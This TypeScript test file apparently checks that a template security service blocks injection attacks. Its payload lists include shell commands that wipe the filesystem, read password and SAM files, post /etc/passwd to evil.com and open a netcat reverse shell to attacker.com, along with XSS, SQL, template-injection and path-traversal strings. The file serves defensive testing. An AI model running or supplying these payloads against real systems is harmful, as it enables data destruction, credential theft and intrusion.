import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { TemplateSecurityService } from '../services/template-security.js';
import { TemplateSecurityMonitor } from '../services/template-security-monitor.js';

/**
 * Penetration Testing Suite for Template Security
 * 
 * This test suite simulates various attack scenarios to validate
 * the security measures implemented in the template system.
 */

describe('Template Security Penetration Tests', () => {
  let securityService: TemplateSecurityService;
  let securityMonitor: TemplateSecurityMonitor;

  beforeEach(() => {
    securityService = new TemplateSecurityService();
    securityMonitor = new TemplateSecurityMonitor();
  });

  describe('Code Injection Attack Scenarios', () => {
    const codeInjectionPayloads = [
      // JavaScript execution attempts
      'eval("malicious code")',
      'Function("return process")().exit()',
      'setTimeout("alert(1)", 0)',
      'setInterval("console.log(process.env)", 1000)',
      
      // Node.js specific attacks
      'require("child_process").exec("rm -rf /")',
      'require("fs").readFileSync("/etc/passwd")',
      'process.exit(1)',
      'global.process.env.SECRET_KEY',
      
      // Template engine exploitation
      '{{constructor.constructor("return process")()}}',
      '{{__proto__.constructor.constructor("return process")()}}',
      '{{this.constructor.constructor("return process")()}}',
      
      // Prototype pollution attempts
      '{{__proto__.polluted = "yes"}}',
      '{{constructor.prototype.polluted = "yes"}}',
      
      // Dynamic code execution
      'new Function("return process")()',
      'eval.call(null, "process.exit()")',
      'Function.prototype.constructor("return process")()',
    ];

    codeInjectionPayloads.forEach((payload, index) => {
      it(`should block code injection payload ${index + 1}: ${payload.substring(0, 50)}...`, async () => {
        const maliciousTemplate = `Hello {{name}}, ${payload}`;
        const result = await securityService.validateTemplateContent(maliciousTemplate);
        
        expect(result.isSecure).toBe(false);
        expect(result.riskScore).toBeGreaterThan(20);
        expect(result.violations.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Cross-Site Scripting (XSS) Attack Scenarios', () => {
    const xssPayloads = [
      // Basic XSS
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)"></iframe>',
      
      // Event handler XSS
      '<div onclick="alert(1)">Click me</div>',
      '<input onfocus="alert(1)" autofocus>',
      '<body onload="alert(1)">',
      '<marquee onstart="alert(1)">',
      
      // JavaScript protocol
      '<a href="javascript:alert(1)">Click</a>',
      '<form action="javascript:alert(1)">',
      
      // Data URI XSS
      '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
      '<object data="data:text/html,<script>alert(1)</script>"></object>',
      
      // CSS-based XSS
      '<style>@import"javascript:alert(1)";</style>',
      '<link rel="stylesheet" href="javascript:alert(1)">',
      
      // Encoded XSS attempts
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '&#60;script&#62;alert(1)&#60;/script&#62;',
    ];

    xssPayloads.forEach((payload, index) => {
      it(`should block XSS payload ${index + 1}: ${payload.substring(0, 50)}...`, async () => {
        const maliciousTemplate = `Hello {{name}}, ${payload}`;
        const result = await securityService.validateTemplateContent(maliciousTemplate);
        
        expect(result.isSecure).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Command Injection Attack Scenarios', () => {
    const commandInjectionPayloads = [
      // Basic command injection
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& curl http://evil.com/steal',
      '|| wget http://malicious.com/backdoor',
      
      // Command substitution
      '$(rm -rf /)',
      '`cat /etc/shadow`',
      '${IFS}cat${IFS}/etc/passwd',
      
      // PowerShell (Windows)
      '; Remove-Item -Recurse -Force C:\\',
      '| Get-Content C:\\Windows\\System32\\config\\SAM',
      
      // Network commands
      '; nc -e /bin/sh attacker.com 4444',
      '| telnet attacker.com 4444',
      '&& curl -X POST -d @/etc/passwd http://evil.com',
      
      // File operations
      '; cat /proc/version',
      '| ls -la /root',
      '&& find / -name "*.key" 2>/dev/null',
    ];

    commandInjectionPayloads.forEach((payload, index) => {
      it(`should block command injection payload ${index + 1}: ${payload}`, async () => {
        const maliciousTemplate = `Hello {{name}}${payload}`;
        const result = await securityService.validateTemplateContent(maliciousTemplate);
        
        expect(result.isSecure).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
      });
    });
  });

  describe('SQL Injection Attack Scenarios', () => {
    const sqlInjectionPayloads = [
      // Basic SQL injection
      "' OR '1'='1",
      "' OR 1=1--",
      "' UNION SELECT * FROM users--",
      "'; DROP TABLE users;--",
      
      // Blind SQL injection
      "' AND (SELECT COUNT(*) FROM users) > 0--",
      "' AND SUBSTRING(@@version,1,1) = '5'--",
      
      // Time-based SQL injection
      "'; WAITFOR DELAY '00:00:05'--",
      "' OR SLEEP(5)--",
      
      // Union-based SQL injection
      "' UNION SELECT username, password FROM admin_users--",
      "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
      
      // Error-based SQL injection
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      
      // NoSQL injection attempts
      "'; return true; var x='",
      "' || '1'=='1",
      "'; return db.users.find(); var x='",
    ];

    sqlInjectionPayloads.forEach((payload, index) => {
      it(`should block SQL injection payload ${index + 1}: ${payload}`, async () => {
        const maliciousTemplate = `Hello {{name}} WHERE id = '${payload}'`;
        const result = await securityService.validateTemplateContent(maliciousTemplate);
        
        expect(result.isSecure).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Template Injection Attack Scenarios', () => {
    const templateInjectionPayloads = [
      // Server-side template injection
      '{{7*7}}',
      '{{config}}',
      '{{request}}',
      '{{session}}',
      '{{self}}',
      
      // Jinja2 specific
      '{{config.items()}}',
      '{{request.environ}}',
      '{{lipsum.__globals__}}',
      
      // Twig specific
      '{{_self.env.getGlobals()}}',
      '{{dump(app)}}',
      
      // Smarty specific
      '{php}echo `id`;{/php}',
      '{literal}<script>alert(1)</script>{/literal}',
      
      // Freemarker specific
      '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\'/etc/passwd\').toURL().openStream().readAllBytes()?join(\' \')}',
      
      // Velocity specific
      '#set($str=$class.forName("java.lang.String"))',
      '$class.forName("java.lang.Runtime").getRuntime().exec("calc")',
      
      // Generic template access attempts
      '{{constructor}}',
      '{{__proto__}}',
      '{{prototype}}',
      '{{this}}',
      '{{global}}',
      '{{process}}',
    ];

    templateInjectionPayloads.forEach((payload, index) => {
      it(`should block template injection payload ${index + 1}: ${payload}`, async () => {
        const maliciousTemplate = `Hello {{name}}, ${payload}`;
        const result = await securityService.validateTemplateContent(maliciousTemplate);
        
        expect(result.isSecure).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Path Traversal Attack Scenarios', () => {
    const pathTraversalPayloads = [
      // Basic path traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      
      // URL encoded
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam',
      
      // Double encoded
      '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
      
      // Unicode encoded
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      
      // Null byte injection
      '../../../etc/passwd%00.txt',
      '..\\..\\..\\windows\\system32\\config\\sam%00.txt',
      
      // File protocol
      'file:///etc/passwd',
      'file://c:/windows/system32/config/sam',
      
      // Absolute paths
      '/etc/passwd',
      'c:\\windows\\system32\\config\\sam',
      
      // Nested traversal
      '....//....//....//etc/passwd',
      '....\\\\....\\\\....\\\\windows\\system32\\config\\sam',
    ];

    pathTraversalPayloads.forEach((payload, index) => {
      it(`should block path traversal payload ${index + 1}: ${payload}`, async () => {
        const maliciousTemplate = `Hello {{name}}, file: ${payload}`;
        const result = await securityService.validateTemplateContent(maliciousTemplate);
        
        expect(result.isSecure).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Sensitive Data Exposure Scenarios', () => {
    const sensitiveDataPatterns = [
      // Credentials
      'password: "admin123"',
      'api_key: "sk-1234567890abcdef"',
      'secret: "my-secret-key"',
      'token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"',
      
      // Personal information
      'ssn: "123-45-6789"',
      'credit_card: "4111-1111-1111-1111"',
      'phone: "+1-555-123-4567"',
      
      // Database credentials
      'db_password: "dbpass123"',
      'connection_string: "mongodb://admin:pass@localhost"',
      'redis_url: "redis://user:pass@localhost:6379"',
      
      // Cloud credentials
      'aws_access_key: "AKIAIOSFODNN7EXAMPLE"',
      'aws_secret_key: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"',
      'gcp_key: "AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI"',
      
      // Private keys
      '-----BEGIN PRIVATE KEY-----',
      '-----BEGIN RSA PRIVATE KEY-----',
      '-----BEGIN OPENSSH PRIVATE KEY-----',
    ];

    sensitiveDataPatterns.forEach((pattern, index) => {
      it(`should detect sensitive data pattern ${index + 1}: ${pattern.substring(0, 30)}...`, async () => {
        const templateWithSensitiveData = `Hello {{name}}, ${pattern}`;
        const result = await securityService.validateTemplateContent(templateWithSensitiveData);
        
        expect(result.isSecure).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
        expect(result.riskScore).toBeGreaterThan(15);
      });
    });
  });

  describe('Denial of Service (DoS) Attack Scenarios', () => {
    it('should prevent extremely large templates', async () => {
      const hugeTemplate = 'x'.repeat(100000); // 100KB template
      const result = await securityService.validateTemplateContent(hugeTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.message.includes('exceeds maximum length'))).toBe(true);
    });

    it('should prevent deeply nested templates', async () => {
      const deeplyNested = '{{'.repeat(20) + 'name' + '}}'.repeat(20);
      const result = await securityService.validateTemplateContent(deeplyNested);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.message.includes('nesting too deep'))).toBe(true);
    });

    it('should prevent excessive variable usage', async () => {
      const manyVariables = Array.from({ length: 200 }, (_, i) => `{{var${i}}}`).join(' ');
      const result = await securityService.validateTemplateContent(manyVariables);
      
      expect(result.warnings.some(w => w.type === 'HIGH_VARIABLE_USAGE')).toBe(true);
    });

    it('should prevent null byte injection', async () => {
      const nullByteTemplate = 'Hello {{name}}\0malicious content';
      const result = await securityService.validateTemplateContent(nullByteTemplate);
      
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.message.includes('null bytes'))).toBe(true);
    });
  });

  describe('Advanced Evasion Techniques', () => {
    const evasionPayloads = [
      // Case variation
      'EVAL("code")',
      'ScRiPt',
      'JavaScript:',
      
      // Whitespace evasion
      'eval\t("code")',
      'eval\n("code")',
      'eval\r("code")',
      'eval ("code")',
      
      // Comment injection
      'eval/*comment*/("code")',
      'eval//comment\n("code")',
      
      // String concatenation
      'ev"+"al("code")',
      "ev'+'al('code')",
      
      // Hex encoding
      '\\x65\\x76\\x61\\x6c', // eval
      '\\u0065\\u0076\\u0061\\u006c', // eval
      
      // Octal encoding
      '\\145\\166\\141\\154', // eval
      
      // Mixed encoding
      'e\\x76al("code")',
      '\\u0065val("code")',
    ];

    evasionPayloads.forEach((payload, index) => {
      it(`should detect evasion technique ${index + 1}: ${payload}`, async () => {
        const maliciousTemplate = `Hello {{name}}, ${payload}`;
        const result = await securityService.validateTemplateContent(maliciousTemplate);
        
        // Some evasion techniques might not be caught by basic pattern matching
        // This test documents current behavior and can be enhanced
        if (!result.isSecure) {
          expect(result.violations.length).toBeGreaterThan(0);
        }
      });
    });
  });

  describe('Security Monitoring Stress Tests', () => {
    it('should handle rapid security violations', async () => {
      const userId = 'attacker123';
      const templateId = 'target456';
      
      // Simulate rapid-fire attack
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(
          securityMonitor.recordSecurityViolation(
            userId,
            templateId,
            'CODE_INJECTION' as any,
            'CRITICAL'
          )
        );
      }
      
      await Promise.all(promises);
      
      const alerts = securityMonitor.getActiveAlerts();
      expect(alerts.length).toBeGreaterThan(0);
      
      const stats = securityMonitor.getSecurityStatistics();
      expect(stats.totalAlerts).toBeGreaterThan(5);
    });

    it('should track multiple attackers', async () => {
      const attackers = ['user1', 'user2', 'user3', 'user4', 'user5'];
      
      for (const attacker of attackers) {
        await securityMonitor.recordSecurityViolation(
          attacker,
          'template123',
          'SCRIPT_INJECTION' as any,
          'HIGH'
        );
      }
      
      const stats = securityMonitor.getSecurityStatistics();
      expect(stats.topViolatingUsers.length).toBe(attackers.length);
    });
  });

  describe('Content Sanitization Effectiveness', () => {
    const maliciousInputs = [
      '<script>alert("XSS")</script>',
      'javascript:alert(1)',
      '<img src="x" onerror="alert(1)">',
      '<iframe src="javascript:alert(1)"></iframe>',
      'onclick="alert(1)"',
      'onload="alert(1)"',
      '{{constructor}}',
      '{{__proto__}}',
      '`rm -rf /`',
      '$(malicious command)',
    ];

    maliciousInputs.forEach((input, index) => {
      it(`should sanitize malicious input ${index + 1}: ${input.substring(0, 30)}...`, () => {
        const sanitized = securityService.sanitizeTemplateContent(input);
        
        // Verify dangerous patterns are removed or neutralized
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onclick=');
        expect(sanitized).not.toContain('onload=');
        
        // Should not contain the original dangerous content
        expect(sanitized.length).toBeLessThanOrEqual(input.length);
      });
    });
  });
});